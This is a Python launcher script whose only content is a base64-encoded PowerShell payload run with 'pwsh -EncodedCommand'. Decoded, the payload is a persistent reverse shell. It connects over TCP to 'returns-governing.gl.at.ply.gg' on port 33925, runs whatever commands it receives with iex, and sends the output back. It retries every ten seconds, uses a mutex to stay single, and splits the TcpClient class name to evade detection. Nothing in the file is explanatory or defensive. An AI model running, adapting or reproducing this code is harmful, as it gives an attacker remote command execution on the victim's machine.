import subprocess


ps_command = ''' CgBmAHUAbgBjAHQAaQBvAG4AIABTAHQAYQByAHQALQBQAGUAcgBzAGkAcwB0AGUAbgB0AEMAbwBtAG0AYQBuAGQAIAB7AAoAIAAgACAAIABwAGEAcgBhAG0AIAAoAAoAIAAgACAAIAAgACAAIAAgAFsAcwB0AHIAaQBuAGcAXQAkAFUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIALAAKACAAIAAgACAAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AJABTAGUAcgB2AGUAcgBBAGQAZAByAGUAcwBzACwACgAgACAAIAAgACAAIAAgACAAWwBpAG4AdABdACQAUABvAHIAdABOAHUAbQBiAGUAcgAKACAAIAAgACAAKQAKACAAIAAgACAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABtAHUAdABlAHgAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABoAHIAZQBhAGQAaQBuAGcALgBNAHUAdABlAHgAKAAkAGYAYQBsAHMAZQAsACAAJABVAG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAG0AdQB0AGUAeAAuAFcAYQBpAHQATwBuAGUAKAAwACwAIAAkAGYAYQBsAHMAZQApACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkAcwBSAHUAbgBuAGkAbgBnACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAEMAbwBtAG0AYQBuAGQATABpAG4AZQAgAC0AbABpAGsAZQAgACIAKgAkAFUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIAKgAiACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAtAG4AbwB0ACAAJABpAHMAUgB1AG4AbgBpAG4AZwApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwAnACcAdABlAG0ALgBOACcAJwBlAHQALgBTAG8AYwAnACcAawBlAHQAcwAuAFQAYwAnACcAcABDAGwAJwAnAGkAZQBuAHQAKAAkAFMAZQByAHYAZQByAEEAZABkAHIAZQBzAHMALAAgACQAUABvAHIAdABOAHUAbQBiAGUAcgApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABiAHkAdABlAFsAXQAgADYANQA1ADMANQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAaQAgAC0AbABlACAAMAApACAAewAgAGIAcgBlAGEAawAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFMAYwByAGkAcAB0ACAAaQBzACAAYQBsAHIAZQBhAGQAeQAgAHIAdQBuAG4AaQBuAGcALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAG0AdQB0AGUAeAAuAFIAZQBsAGUAYQBzAGUATQB1AHQAZQB4ACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEEAbgBvAHQAaABlAHIAIABpAG4AcwB0AGEAbgBjAGUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAcgB1AG4AbgBpAG4AZwAuACIACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAxADAACgAgACAAIAAgAH0ACgB9AAoAUwB0AGEAcgB0AC0AUABlAHIAcwBpAHMAdABlAG4AdABDAG8AbQBtAGEAbgBkACAALQBVAG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACAAIgBLAGUAcgBlAHMAIgAgAC0AUwBlAHIAdgBlAHIAQQBkAGQAcgBlAHMAcwAgACIAcgBlAHQAdQByAG4AcwAtAGcAbwB2AGUAcgBuAGkAbgBnAC4AZwBsAC4AYQB0AC4AcABsAHkALgBnAGcAIgAgAC0AUABvAHIAdABOAHUAbQBiAGUAcgAgADMAMwA5ADIANQAKAA=='''

command=f'''pwsh -EncodedCommand {ps_command}
'''
try:


    subprocess.run(command, shell=True, check=True)


except subprocess.CalledProcessError as e:
    print("Error executing PowerShell command:", e)